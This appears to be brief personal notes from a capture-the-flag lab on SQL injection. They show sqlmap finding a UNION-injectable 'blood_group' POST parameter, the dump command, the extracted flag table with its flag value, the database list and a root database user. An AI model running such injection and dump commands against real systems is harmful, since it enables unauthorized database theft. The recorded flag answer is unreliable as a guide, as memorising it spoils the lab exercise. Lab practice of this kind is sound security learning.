# writeups

/blood                (Status: 301) [Size: 194] [--> http://10.10.124.215/blood/]

```
[18:04:23] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'blood_group' is vulnerable. 
```

after making `└─$ sqlmap -r blood.txt -D blood --dump`


```
Database: blood
Table: flag
[1 entry]
+----+---------------------+------+
| id | flag                | name |
+----+---------------------+------+
| 1  | thm{sqlm@p_is_L0ve} | flag |
+----+---------------------+------+
```

`nare@sqlmap.com.np`


```
[*] blood
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] test
```

`current user: 'root@localhost'`

